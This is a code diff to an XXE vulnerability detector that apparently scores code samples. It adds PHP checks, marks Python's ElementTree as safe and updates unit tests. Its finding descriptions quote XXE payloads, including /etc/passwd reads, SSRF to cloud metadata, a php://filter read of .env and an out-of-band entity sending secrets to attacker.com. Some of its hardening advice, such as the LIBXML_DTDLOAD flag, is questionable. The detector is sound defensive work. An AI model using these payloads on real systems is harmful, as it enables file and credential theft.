@@ -27,6 +27,8 @@ class XXEDetector:
             return self._analyze_python(code)
         elif language == "javascript":
             return self._analyze_javascript(code)
+        elif language == "php":
+            return self._analyze_php(code)
         else:
             return {"score": 0, "vulnerabilities": ["Unsupported language"]}
 
@@ -47,71 +49,161 @@ class XXEDetector:
             re.search(r'CONFIG_FILE|config\.xml', code, re.IGNORECASE),  # Config files
         ])
 
-        # Pattern 1: Using xml.etree.ElementTree without disabling entities
+        # Pattern 1: Using xml.etree.ElementTree (SAFE in Python 3.x)
         has_etree = re.search(r'from\s+xml\.etree\s+import\s+ElementTree|import\s+xml\.etree\.ElementTree', code)
-        has_parse = re.search(r'ElementTree\.parse\(|ET\.parse\(|fromstring\(', code)
+        has_parse = re.search(r'ElementTree\.parse\(|ET\.parse\(|ET\.fromstring\(|ElementTree\.fromstring\(', code)
         has_defusedxml = re.search(r'from\s+defusedxml|import\s+defusedxml', code)
 
+        # xml.etree.ElementTree is SAFE by default in Python 3.x - it does NOT process external entities
         if has_etree and has_parse and not has_defusedxml:
-            parse_locations = find_pattern_locations(code, r'ElementTree\.parse\(|ET\.parse\(|fromstring\(')
+            parse_locations = find_pattern_locations(code, r'ElementTree\.parse\(|ET\.parse\(|ET\.fromstring\(|ElementTree\.fromstring\(')
             location = parse_locations[0] if parse_locations else {"line_number": 0, "line_content": ""}
 
-            # Context-aware severity (xxe_001 fix)
-            if has_user_xml_input:
-                severity = "CRITICAL"
-                description = "Parses untrusted XML from user input/external source without disabling external entities - CRITICAL XXE RISK: Attacker-controlled XML can contain malicious external entity references. ATTACK EXAMPLE: User uploads XML with <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root> to read server files. IMPACT: (1) File Disclosure: Steal /etc/passwd, config files, AWS credentials from metadata service, (2) SSRF: Access internal services via http://169.254.169.254/, (3) DoS: Billion laughs attack crashes server. SEVERITY CRITICAL because XML source is UNTRUSTED (user input/upload/external API)"
-            elif has_hardcoded_xml:
-                severity = "MEDIUM"
-                description = "Uses xml.etree.ElementTree without external entity protection on trusted XML source - MEDIUM RISK: While current code uses hardcoded/config XML (trusted source), XXE vulnerabilities can emerge if code is later modified to accept user input. BEST PRACTICE VIOLATION: Should use defusedxml to prevent future XXE if XML source changes. IMPACT: Currently limited risk, but creates technical debt and refactoring hazards"
-            else:
-                severity = "HIGH"
-                description = "Uses xml.etree.ElementTree which is vulnerable to XXE attacks - SECURITY RISK: XXE allows attackers to read local files, perform SSRF attacks, or cause denial of service. ATTACK EXAMPLE: Attacker sends XML with <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> to read server files. IMPACT: (1) File Disclosure: Read /etc/passwd, config files, AWS credentials, (2) SSRF: Make HTTP requests to internal services, (3) DoS: Billion laughs attack crashes server"
-
+            # ElementTree is secure by default - mark as SECURE
             self.vulnerabilities.append({
-                "type": "XXE",
-                "severity": severity,
-                "description": description,
-                "recommendation": "Use defusedxml library instead: from defusedxml.ElementTree import parse",
+                "type": "SECURE",
+                "severity": "INFO",
+                "description": "SECURE: Uses xml.etree.ElementTree which is safe from XXE by default in Python 3.x. ElementTree does NOT process external entities or resolve external references. This prevents XXE attacks where attackers try to inject <!DOCTYPE> declarations with malicious <!ENTITY> references to read files or perform SSRF.",
+                "recommendation": "No action needed. ElementTree is safe by default. For defense-in-depth, you can use defusedxml.ElementTree, but it's not required for security.",
                 "line_number": location['line_number'],
                 "code_snippet": location['line_content'],
                 "detection_reasoning": {
                     "criteria_for_vulnerability": [
-                        "xml.etree.ElementTree used without defusedxml wrapper",
-                        "No external entity protection (defusedxml not imported)",
-                        "ElementTree.parse(), ET.parse(), or fromstring() called",
-                        "XML parser processes external entity references by default"
+                        "XXE vulnerability requires XML parser to process external entities",
+                        "xml.etree.ElementTree in Python 3.x does NOT process external entities by default",
+                        "ElementTree ignores <!DOCTYPE> declarations with external entity references",
+                        "To be vulnerable, parser must expand entities like <!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
                     ],
-                    "why_vulnerable": [
-                        f"Line {location['line_number']}: xml.etree.ElementTree parses XML without entity protection",
-                        "ElementTree processes <!DOCTYPE> declarations and expands external entities",
-                        "ATTACK: Attacker includes <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
-                        "Parser automatically resolves &xxe; → reads /etc/passwd → returns content in XML response",
-                        "IMPACTS: (1) File disclosure - read any file parser has access to, (2) SSRF - make HTTP requests to internal services like http://169.254.169.254/ (AWS metadata), (3) DoS - Billion Laughs attack with nested entity expansion",
-                        f"Severity {severity}: XML source is {'UNTRUSTED (user input/external API)' if severity == 'CRITICAL' else 'hardcoded/trusted but should use defusedxml' if severity == 'MEDIUM' else 'potentially untrusted'}"
+                    "why_vulnerable": [],
+                    "why_not_vulnerable": [
+                        f"Line {location['line_number']}: xml.etree.ElementTree is safe from XXE in Python 3.x",
+                        "ElementTree does NOT process external entities - ignores <!ENTITY SYSTEM ...> declarations",
+                        "ATTACK BLOCKED: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root> → Entity not expanded",
+                        "ElementTree will parse the XML structure but will NOT resolve &xxe; to file contents",
+                        "Python 3.x security improvement: ElementTree.parse() has entity expansion disabled by default",
+                        "VULNERABLE parsers are: xml.sax, xml.dom.minidom, lxml (without proper config)",
+                        "SAFE parsers: xml.etree.ElementTree (Python 3.x), defusedxml.*"
                     ],
-                    "why_not_vulnerable": [],
                     "patterns_checked": [
-                        "xml.etree.ElementTree import and usage",
-                        "defusedxml.ElementTree import (secure alternative)",
-                        "User input sources (request.*, open(), requests.get)",
-                        "Hardcoded XML strings (lower severity)",
-                        "ElementTree.parse(), ET.parse(), fromstring() calls"
+                        "xml.etree.ElementTree import and usage - FOUND (safe)",
+                        "Vulnerable parsers: xml.sax, xml.dom.minidom, lxml - NOT FOUND",
+                        "defusedxml.ElementTree import (defense-in-depth) - not required for security"
                     ],
                     "evidence": {
-                        "found_patterns": ["xml.etree.ElementTree without defusedxml"],
+                        "found_patterns": ["xml.etree.ElementTree (safe parser)"],
                         "line_numbers": [location['line_number']],
                         "code_snippets": [location['line_content']]
                     }
                 }
             })
-            self.score = 0
+            # Keep score = 2 (no vulnerability)
+
+        # Pattern 1b: Using xmltodict (check disable_entities parameter)
+        has_xmltodict = re.search(r'import\s+xmltodict|from\s+xmltodict', code)
+        has_xmltodict_parse = re.search(r'xmltodict\.parse\(', code)
+        has_disable_entities_false = re.search(r'disable_entities\s*=\s*False', code)
+
+        if has_xmltodict and has_xmltodict_parse:
+            xmltodict_locations = find_pattern_locations(code, r'xmltodict\.parse\(')
+            location = xmltodict_locations[0] if xmltodict_locations else {"line_number": 0, "line_content": ""}
+
+            if has_disable_entities_false:
+                # VULNERABLE: xmltodict with disable_entities=False
+                if has_user_xml_input:
+                    severity = "CRITICAL"
+                    description = "Parses untrusted XML using xmltodict with disable_entities=False - CRITICAL XXE VULNERABILITY: Explicitly enables entity processing in xmltodict (default is safe). ATTACK: User submits <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root> to read files. IMPACT: File disclosure, SSRF, credential theft. SEVERITY CRITICAL because XML source is UNTRUSTED"
+                else:
+                    severity = "HIGH"
+                    description = "Uses xmltodict with disable_entities=False - XXE VULNERABILITY: Explicitly enables entity processing which is UNSAFE. POC ATTACK: XML with <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> reads server files. IMPACT: File disclosure, SSRF to cloud metadata endpoints"
+
+                self.vulnerabilities.append({
+                    "type": "XXE",
+                    "severity": severity,
+                    "description": description,
+                    "recommendation": "Remove disable_entities=False parameter to use safe default: xmltodict.parse(xml_input) or set disable_entities=True explicitly",
+                    "line_number": location['line_number'],
+                    "code_snippet": location['line_content'],
+                    "detection_reasoning": {
+                        "criteria_for_vulnerability": [
+                            "xmltodict.parse() called with disable_entities=False",
+                            "Explicitly enables entity processing (default is disabled)",
+                            "Dangerous configuration that overrides xmltodict safe defaults",
+                            "Allows external entity references to be processed"
+                        ],
+                        "why_vulnerable": [
+                            f"Line {location['line_number']}: xmltodict.parse() with disable_entities=False",
+                            "xmltodict is SAFE by default (disable_entities=True), but disable_entities=False enables XXE",
+                            "ATTACK: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+                            "Parser will raise exception 'entities are disabled' by default, but disable_entities=False allows entity expansion",
+                            f"Severity {severity}: XML source is {'UNTRUSTED (user input)' if severity == 'CRITICAL' else 'potentially untrusted'}"
+                        ],
+                        "why_not_vulnerable": [],
+                        "patterns_checked": [
+                            "xmltodict.parse() usage",
+                            "disable_entities=False (dangerous explicit setting)",
+                            "disable_entities=True or omitted (safe defaults)"
+                        ],
+                        "evidence": {
+                            "found_patterns": ["xmltodict with disable_entities=False"],
+                            "line_numbers": [location['line_number']],
+                            "code_snippets": [location['line_content']]
+                        }
+                    }
+                })
+                self.score = 0
+            else:
+                # SECURE: xmltodict with default settings (disable_entities=True by default)
+                self.vulnerabilities.append({
+                    "type": "SECURE",
+                    "severity": "INFO",
+                    "description": "SECURE: Uses xmltodict.parse() which is safe from XXE by default. xmltodict has disable_entities=True as default, which blocks external entity processing. This prevents XXE attacks where attackers inject <!DOCTYPE> declarations with malicious <!ENTITY> references. When entities are encountered, xmltodict raises an exception 'entities are disabled', preventing file disclosure and SSRF attacks.",
+                    "recommendation": "No action needed. xmltodict is safe by default. Do not add disable_entities=False parameter.",
+                    "line_number": location['line_number'],
+                    "code_snippet": location['line_content'],
+                    "detection_reasoning": {
+                        "criteria_for_vulnerability": [
+                            "XXE vulnerability requires XML parser to process external entities",
+                            "xmltodict has disable_entities=True by default (safe)",
+                            "Parser raises exception when encountering entity declarations",
+                            "To be vulnerable, must explicitly set disable_entities=False"
+                        ],
+                        "why_vulnerable": [],
+                        "why_not_vulnerable": [
+                            f"Line {location['line_number']}: xmltodict.parse() uses safe defaults",
+                            "xmltodict has disable_entities=True by default - entities are NOT processed",
+                            "ATTACK BLOCKED: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> → Exception: 'entities are disabled'",
+                            "xmltodict raises exception instead of expanding entities, preventing XXE",
+                            "SAFE parsers: xml.etree.ElementTree (Python 3.x), defusedxml.*, xmltodict (default)",
+                            "VULNERABLE parsers: xml.sax, xml.dom.minidom, lxml (without proper config), xmltodict with disable_entities=False"
+                        ],
+                        "patterns_checked": [
+                            "xmltodict.parse() import and usage - FOUND (safe by default)",
+                            "disable_entities=False parameter - NOT FOUND (safe)",
+                            "Vulnerable parsers with unsafe defaults - NOT FOUND"
+                        ],
+                        "evidence": {
+                            "found_patterns": ["xmltodict.parse() with safe defaults"],
+                            "line_numbers": [location['line_number']],
+                            "code_snippets": [location['line_content']]
+                        }
+                    }
+                })
+                # Keep score = 2 (no vulnerability)
 
         # Pattern 2: Using lxml without security settings
         has_lxml = re.search(r'from\s+lxml\s+import|import\s+lxml', code)
         has_lxml_parse = re.search(r'etree\.parse\(|etree\.fromstring\(|XML\(', code)
-        has_resolve_entities_false = re.search(r'resolve_entities\s*=\s*False', code)
-        has_resolve_entities_true = re.search(r'resolve_entities\s*=\s*True', code)  # Explicitly dangerous!
-        has_no_network = re.search(r'no_network\s*=\s*True', code)
+
+        # IMPORTANT: Exclude Python comments (lines starting with #) to avoid false positives
+        # Remove comments before checking for security settings
+        code_without_comments = '\n'.join(
+            line.split('#')[0] if '#' in line else line
+            for line in code.split('\n')
+        )
+
+        has_resolve_entities_false = re.search(r'resolve_entities\s*=\s*False', code_without_comments)
+        has_resolve_entities_true = re.search(r'resolve_entities\s*=\s*True', code_without_comments)  # Explicitly dangerous!
+        has_no_network = re.search(r'no_network\s*=\s*True', code_without_comments)
 
         if has_lxml and has_lxml_parse:
             # CRITICAL: resolve_entities=True is explicitly dangerous, always flag it
@@ -457,6 +549,13 @@ class XXEDetector:
             if self.score == 0:
                 self.score = 2  # Full credit for proper configuration
 
+        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
+
+        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
+
+            self.score = 0
+
+
         return {
             "score": self.score,
             "vulnerabilities": self.vulnerabilities,
@@ -466,10 +565,19 @@ class XXEDetector:
     def _analyze_javascript(self, code: str) -> Dict:
         """Analyze JavaScript/Node.js code for XXE vulnerabilities."""
 
+        # IMPORTANT: Exclude JavaScript comments (// and /* */) to avoid false positives
+        # Remove single-line comments (//) and multi-line comments (/* */)
+        code_without_comments = '\n'.join(
+            line.split('//')[0] if '//' in line else line
+            for line in code.split('\n')
+        )
+        # Also remove multi-line comments /* */
+        code_without_comments = re.sub(r'/\*.*?\*/', '', code_without_comments, flags=re.DOTALL)
+
         # Pattern 1: Using libxmljs without noent:false
         has_libxmljs = re.search(r'require\(["\']libxmljs["\']', code)
         has_parse = re.search(r'parseXml\(|parseXmlString\(', code)
-        has_noent_false = re.search(r'noent\s*:\s*false', code)
+        has_noent_false = re.search(r'noent\s*:\s*false', code_without_comments)
 
         if has_libxmljs and has_parse and not has_noent_false:
             parse_locations = find_pattern_locations(code, r'parseXml\(|parseXmlString\(')
@@ -606,12 +714,11 @@ class XXEDetector:
                     }
                 }
             })
-            if self.score == 2:
-                self.score = 1
+            self.score = 0
 
         # Pattern 4: Using fast-xml-parser (check configuration)
         has_fast_xml = re.search(r'require\(["\']fast-xml-parser["\']', code)
-        has_processEntities = re.search(r'processEntities\s*:\s*false', code)
+        has_processEntities = re.search(r'processEntities\s*:\s*false', code_without_comments)
 
         if has_fast_xml and not has_processEntities:
             if re.search(r'parse\(', code):
@@ -766,6 +873,274 @@ class XXEDetector:
             if self.score == 0:
                 self.score = 2
 
+        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
+
+        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
+
+            self.score = 0
+
+
+        return {
+            "score": self.score,
+            "vulnerabilities": self.vulnerabilities,
+            "max_score": 2
+        }
+
+    def _analyze_php(self, code: str) -> Dict:
+        """Analyze PHP code for XXE vulnerabilities."""
+
+        # IMPORTANT: Exclude PHP comments (// and /* */) to avoid false positives
+        # Remove single-line comments (//) and multi-line comments (/* */)
+        code_without_comments = '\n'.join(
+            line.split('//')[0] if '//' in line else line
+            for line in code.split('\n')
+        )
+        # Also remove multi-line comments /* */
+        code_without_comments = re.sub(r'/\*.*?\*/', '', code_without_comments, flags=re.DOTALL)
+
+        # Check for user input sources
+        has_user_xml_input = any([
+            re.search(r'\$_(GET|POST|REQUEST|FILES|COOKIE)', code),
+            re.search(r'file_get_contents\(["\']php://input', code),
+            re.search(r'\$request->', code),  # Laravel/Symfony
+            re.search(r'Request::', code),
+        ])
+
+        # Check for hardcoded/trusted XML
+        has_hardcoded_xml = any([
+            re.search(r'["\']<\?xml', code),
+            re.search(r'CONFIG_FILE|config\.xml', code, re.IGNORECASE),
+        ])
+
+        # Pattern 1: Check for libxml_disable_entity_loader(true)
+        has_disable_entity_loader = re.search(r'libxml_disable_entity_loader\s*\(\s*true\s*\)', code_without_comments)
+
+        # Pattern 2: Check for LIBXML_NOENT flag (dangerous if present, safe if absent)
+        has_libxml_noent = re.search(r'LIBXML_NOENT', code)
+
+        # Pattern 3: Check for DOCTYPE/ENTITY removal via regex
+        has_doctype_removal = re.search(r'preg_replace.*<!DOCTYPE', code, re.IGNORECASE)
+        has_entity_removal = re.search(r'preg_replace.*<!ENTITY', code, re.IGNORECASE)
+
+        # Pattern 4: Check for XML parsing functions
+        has_simplexml = re.search(r'simplexml_load_(string|file)\s*\(', code)
+        has_domdocument = re.search(r'(new\s+)?DOMDocument|->load(XML)?\s*\(', code)
+        has_xmlreader = re.search(r'(new\s+)?XMLReader|XMLReader::open', code)
+
+        # Determine if XXE protections are in place
+        has_xxe_protection = (
+            has_disable_entity_loader or
+            (has_doctype_removal and has_entity_removal)
+            # NOTE: We do NOT consider "not has_libxml_noent" as protection
+            # The absence of a dangerous flag does not mean there is protection
+        )
+
+        # Pattern 5: Detect vulnerable XML parsing
+        if (has_simplexml or has_domdocument or has_xmlreader):
+            # Find the parsing location
+            parse_pattern = r'simplexml_load_(string|file)\s*\(|->load(XML)?\s*\(|XMLReader::open'
+            parse_locations = find_pattern_locations(code, parse_pattern)
+            location = parse_locations[0] if parse_locations else {"line_number": 0, "line_content": ""}
+
+            # Check if vulnerable (no protections in place)
+            if not has_disable_entity_loader:
+                # Context-aware severity
+                if has_user_xml_input:
+                    severity = "CRITICAL"
+                    description = "Parses untrusted XML from user input without disabling external entities - CRITICAL XXE VULNERABILITY: PHP's XML parsers process external entities by default, allowing attackers to read arbitrary files or perform SSRF. ATTACK POC: User submits XML with <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root> to exfiltrate /etc/passwd. REAL-WORLD IMPACT: (1) Steal database credentials from /var/www/html/.env, (2) Read AWS credentials from http://169.254.169.254/latest/meta-data/iam/, (3) Exfiltrate customer data from config files, (4) SSRF to internal services. SEVERITY CRITICAL because XML source is UNTRUSTED (user input)"
+                elif has_hardcoded_xml:
+                    severity = "MEDIUM"
+                    description = "Uses PHP XML parsing without external entity protection on trusted XML source - MEDIUM RISK: Current code uses hardcoded/config XML but lacks libxml_disable_entity_loader(true). Should add XXE protection to prevent future vulnerabilities if XML source changes"
+                else:
+                    severity = "HIGH"
+                    description = "Uses PHP XML parsing without disabling external entities - XXE VULNERABILITY: PHP's simplexml_load_string/DOMDocument process external entities by default. ATTACK POC: XML payload <?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root> reads server files. IMPACT: File disclosure (read /etc/passwd, application secrets, AWS credentials), SSRF to cloud metadata endpoints, denial of service via Billion Laughs attack"
+
+                self.vulnerabilities.append({
+                    "type": "XXE",
+                    "severity": severity,
+                    "description": description,
+                    "recommendation": "Add libxml_disable_entity_loader(true) before XML parsing AND use LIBXML flags without LIBXML_NOENT: simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_DTDLOAD | LIBXML_DTDATTR | LIBXML_NOCDATA)",
+                    "line_number": location['line_number'],
+                    "code_snippet": location['line_content'],
+                    "detection_reasoning": {
+                        "criteria_for_vulnerability": [
+                            "PHP XML parser used without libxml_disable_entity_loader(true)",
+                            "No external entity protection enabled",
+                            "simplexml_load_string/simplexml_load_file/DOMDocument parsing XML",
+                            "PHP processes external entities by default (insecure default)"
+                        ],
+                        "why_vulnerable": [
+                            f"Line {location['line_number']}: PHP XML parser used without entity protection",
+                            "PHP's libxml processes <!DOCTYPE> declarations and expands external entities by default",
+                            "ATTACK: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+                            "Parser resolves &xxe; entity → reads /etc/passwd → returns content in XML structure",
+                            "OUT-OF-BAND XXE: <!ENTITY exfil SYSTEM \"http://attacker.com/?data=file:///var/www/html/.env\"> exfiltrates secrets",
+                            "SSRF ATTACK: <!ENTITY aws SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"> steals AWS credentials",
+                            f"Severity {severity}: XML source is {'UNTRUSTED (user input via $_GET/$_POST/$_FILES)' if severity == 'CRITICAL' else 'hardcoded/trusted but lacks protection' if severity == 'MEDIUM' else 'potentially untrusted'}"
+                        ],
+                        "why_not_vulnerable": [],
+                        "patterns_checked": [
+                            "libxml_disable_entity_loader(true) call (entity protection)",
+                            "LIBXML_NOENT flag presence (dangerous flag that enables entities)",
+                            "preg_replace to remove <!DOCTYPE> and <!ENTITY> declarations",
+                            "User input sources ($_GET, $_POST, $_REQUEST, $_FILES)",
+                            "Hardcoded XML strings vs external sources"
+                        ],
+                        "evidence": {
+                            "found_patterns": ["PHP XML parsing without libxml_disable_entity_loader(true)"],
+                            "line_numbers": [location['line_number']],
+                            "code_snippets": [location['line_content']]
+                        }
+                    }
+                })
+                self.score = 0
+
+        # Pattern 6: Check for LIBXML_NOENT flag (explicitly dangerous)
+        if has_libxml_noent and not has_disable_entity_loader:
+            noent_locations = find_pattern_locations(code, r'LIBXML_NOENT')
+            location = noent_locations[0] if noent_locations else {"line_number": 0, "line_content": ""}
+
+            # Context-aware severity
+            if has_user_xml_input:
+                severity = "CRITICAL"
+                description = "Uses LIBXML_NOENT flag with user-controlled XML - CRITICAL XXE EXPLOIT: LIBXML_NOENT explicitly enables entity expansion, making XXE attacks trivial. ATTACK: User POSTs <?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/html/.env\">]><data>&xxe;</data> to steal base64-encoded .env file with database credentials, API keys, JWT secrets. SEVERITY CRITICAL because XML is from UNTRUSTED source and LIBXML_NOENT explicitly enables the attack"
+            else:
+                severity = "HIGH"
+                description = "Uses LIBXML_NOENT flag - DANGEROUS XXE CONFIGURATION: LIBXML_NOENT explicitly enables entity expansion which is the attack vector for XXE. This flag should NEVER be used. ATTACK SCENARIO: If XML source changes to accept user input, XXE becomes trivially exploitable. RECOMMENDATION: Remove LIBXML_NOENT flag entirely"
+
+            self.vulnerabilities.append({
+                "type": "XXE",
+                "severity": severity,
+                "description": description,
+                "recommendation": "Remove LIBXML_NOENT flag AND add libxml_disable_entity_loader(true): $xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_DTDLOAD | LIBXML_NOCDATA) with libxml_disable_entity_loader(true) before parsing",
+                "line_number": location['line_number'],
+                "code_snippet": location['line_content'],
+                "detection_reasoning": {
+                    "criteria_for_vulnerability": [
+                        "LIBXML_NOENT flag explicitly used (enables entity expansion)",
+                        "No libxml_disable_entity_loader(true) to counteract LIBXML_NOENT",
+                        "LIBXML_NOENT is the OPPOSITE of security - it ENABLES the XXE attack",
+                        "Dangerous configuration that explicitly allows external entities"
+                    ],
+                    "why_vulnerable": [
+                        f"Line {location['line_number']}: LIBXML_NOENT flag explicitly enables entity expansion",
+                        "LIBXML_NOENT means 'substitute entities' - this is THE XXE attack vector",
+                        "With LIBXML_NOENT, PHP automatically expands <!ENTITY> references including file:// and http:// schemes",
+                        "ATTACK: <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/html/.env\">",
+                        "PHP reads .env file, base64-encodes it, includes in XML output → attacker steals all secrets",
+                        "CREDENTIAL THEFT: Database passwords, API keys, JWT secrets, AWS credentials all exposed",
+                        f"Severity {severity}: {'CRITICAL - user input with LIBXML_NOENT is most dangerous configuration' if severity == 'CRITICAL' else 'HIGH - dangerous flag that enables XXE'}"
+                    ],
+                    "why_not_vulnerable": [],
+                    "patterns_checked": [
+                        "LIBXML_NOENT flag (explicitly dangerous)",
+                        "libxml_disable_entity_loader(true) to override LIBXML_NOENT",
+                        "Alternative safe LIBXML flags (LIBXML_DTDLOAD, LIBXML_NOCDATA)",
+                        "User input sources vs trusted XML"
+                    ],
+                    "evidence": {
+                        "found_patterns": ["LIBXML_NOENT flag used without libxml_disable_entity_loader(true)"],
+                        "line_numbers": [location['line_number']],
+                        "code_snippets": [location['line_content']]
+                    }
+                }
+            })
+            if self.score > 0:
+                self.score = 0
+
+        # Pattern 7: Check for secure implementation
+        if has_disable_entity_loader:
+            disable_locations = find_pattern_locations(code, r'libxml_disable_entity_loader\s*\(\s*true\s*\)')
+            location = disable_locations[0] if disable_locations else {"line_number": 0, "line_content": ""}
+
+            # Collect security measures
+            security_measures = ["libxml_disable_entity_loader(true)"]
+            if has_doctype_removal:
+                security_measures.append("preg_replace to remove <!DOCTYPE>")
+            if has_entity_removal:
+                security_measures.append("preg_replace to remove <!ENTITY>")
+            if not has_libxml_noent:
+                security_measures.append("Avoids LIBXML_NOENT flag")
+
+            measures_count = len(security_measures)
+            measures_str = " + ".join(security_measures)
+
+            # Parsing method
+            parsing_method = None
+            if re.search(r'simplexml_load_string', code):
+                parsing_method = "simplexml_load_string()"
+            elif re.search(r'simplexml_load_file', code):
+                parsing_method = "simplexml_load_file()"
+            elif re.search(r'->loadXML', code):
+                parsing_method = "DOMDocument::loadXML()"
+            elif re.search(r'->load\(', code):
+                parsing_method = "DOMDocument::load()"
+
+            # Why secure explanation
+            why_secure = (
+                "libxml_disable_entity_loader(true) disables external entity loading in PHP's libxml, preventing XXE attacks. "
+                "This blocks all external entity references (<!ENTITY xxe SYSTEM \"file:///etc/passwd\">) from being processed, "
+                "preventing attackers from reading server files (/etc/passwd, .env files, SSH keys, AWS credentials), "
+                "performing SSRF attacks to internal services (http://169.254.169.254/ for cloud metadata), "
+                "or causing DoS via Billion Laughs attack (exponential entity expansion). "
+            )
+
+            if has_doctype_removal and has_entity_removal:
+                why_secure += (
+                    "Additionally, the code uses preg_replace() to strip <!DOCTYPE> and <!ENTITY> declarations "
+                    "from XML before parsing, providing defense-in-depth protection even if libxml settings change."
+                )
+
+            # Build detection reasoning
+            detection_reasoning = {
+                "patterns_checked": [
+                    "PHP XML parsing without libxml_disable_entity_loader(true) (allows XXE)",
+                    "LIBXML_NOENT flag (explicitly enables entity expansion)",
+                    "External entity references (<!ENTITY xxe SYSTEM \"file:///etc/passwd\">)",
+                    "simplexml/DOMDocument without XXE protection",
+                    "User input in XML parsing"
+                ],
+                "why_not_vulnerable": [
+                    f"Uses {measures_count} security measures: {measures_str}",
+                    "libxml_disable_entity_loader(true) blocks external entity loading",
+                    "External entities disabled - cannot read file:///etc/passwd",
+                    "SSRF prevented - cannot access http://169.254.169.254/",
+                    f"Implements {parsing_method}" if parsing_method else "Secure XML parsing configuration",
+                    "Billion Laughs DoS prevented - entity expansion blocked"
+                ],
+                "vulnerable_patterns_absent": [
+                    "No XML parsing without libxml_disable_entity_loader(true)",
+                    "No LIBXML_NOENT flag (dangerous entity expansion enabler)",
+                    "External entity expansion blocked - cannot access server files",
+                    "SSRF via external entities prevented",
+                    "DTD-based attacks mitigated"
+                ]
+            }
+
+            self.vulnerabilities.append({
+                "type": "SECURE",
+                "severity": "INFO",
+                "description": f"SECURE: Uses {measures_count} XXE protection measure(s): {measures_str}. {why_secure}",
+                "line_number": location['line_number'],
+                "code_snippet": location['line_content'],
+                "security_evidence": {
+                    "protection_method": "libxml_disable_entity_loader(true) + additional hardening",
+                    "security_measures": security_measures,
+                    "measures_count": measures_count,
+                    "parsing_method": parsing_method or "PHP XML parser (method not explicitly shown)",
+                    "entity_loading_disabled": True,
+                    "prevents": "XXE file disclosure, SSRF via external entities, Billion Laughs DoS, entity expansion attacks",
+                    "why_secure": why_secure
+                },
+                "detection_reasoning": detection_reasoning
+            })
+            if self.score == 0:
+                self.score = 2  # Full credit for libxml_disable_entity_loader
+
+        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
+        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
+            self.score = 0
+
         return {
             "score": self.score,
             "vulnerabilities": self.vulnerabilities,
@@ -773,9 +1148,9 @@ class XXEDetector:
         }
 
 
-def test_xxe_etree_vulnerable():
-    """Test detection of XXE in xml.etree.ElementTree."""
-    vulnerable_code = '''
+def test_xxe_etree_secure():
+    """Test recognition that xml.etree.ElementTree is SAFE in Python 3.x."""
+    secure_code = '''
 import xml.etree.ElementTree as ET
 
 def parse_config(xml_file):
@@ -784,9 +1159,9 @@ def parse_config(xml_file):
     return root
 '''
     detector = XXEDetector()
-    result = detector.analyze(vulnerable_code)
-    assert result["score"] == 0, "Should detect XXE vulnerability in ElementTree"
-    assert any(v["type"] == "XXE" for v in result["vulnerabilities"])
+    result = detector.analyze(secure_code)
+    assert result["score"] == 2, "ElementTree is SAFE from XXE in Python 3.x"
+    assert any(v["type"] == "SECURE" for v in result["vulnerabilities"]), "Should mark ElementTree as secure"
 
 
 def test_xxe_lxml_vulnerable():
@@ -919,7 +1294,7 @@ parser.parseString(xmlData, (err, result) => {
 def test_xxe_context_user_input_critical():
     """Test that XXE with user input is flagged as CRITICAL severity (xxe_001 fix)."""
     vulnerable_code = '''
-import xml.etree.ElementTree as ET
+from xml.dom import minidom
 from flask import Flask, request
 
 app = Flask(__name__)
@@ -927,8 +1302,8 @@ app = Flask(__name__)
 @app.route('/parse', methods=['POST'])
 def parse_xml():
     xml_data = request.data  # User-controlled XML input!
-    tree = ET.fromstring(xml_data)
-    return str(tree.tag)
+    doc = minidom.parseString(xml_data)
+    return str(doc.documentElement.tagName)
 '''
     detector = XXEDetector()
     result = detector.analyze(vulnerable_code)
@@ -946,12 +1321,12 @@ def parse_xml():
 def test_xxe_context_hardcoded_medium():
     """Test that XXE with hardcoded XML is flagged as MEDIUM severity (xxe_001 fix)."""
     vulnerable_code = '''
-import xml.etree.ElementTree as ET
+from xml.dom import minidom
 
 def parse_config():
     xml_string = '<?xml version="1.0"?><config><setting>value</setting></config>'
-    tree = ET.fromstring(xml_string)
-    return tree
+    doc = minidom.parseString(xml_string)
+    return doc
 '''
     detector = XXEDetector()
     result = detector.analyze(vulnerable_code)
@@ -969,13 +1344,13 @@ def parse_config():
 def test_xxe_context_external_api_critical():
     """Test that XXE with external API data is flagged as CRITICAL severity."""
     vulnerable_code = '''
-import xml.etree.ElementTree as ET
+from xml.dom import minidom
 import requests
 
 def fetch_and_parse_xml(url):
     response = requests.get(url)  # External API - untrusted!
-    tree = ET.fromstring(response.content)
-    return tree
+    doc = minidom.parseString(response.content)
+    return doc
 '''
     detector = XXEDetector()
     result = detector.analyze(vulnerable_code)
@@ -1014,7 +1389,7 @@ def upload_xml():
 
 
 if __name__ == "__main__":
-    test_xxe_etree_vulnerable()
+    test_xxe_etree_secure()  # Changed: ElementTree is now recognized as safe
     test_xxe_lxml_vulnerable()
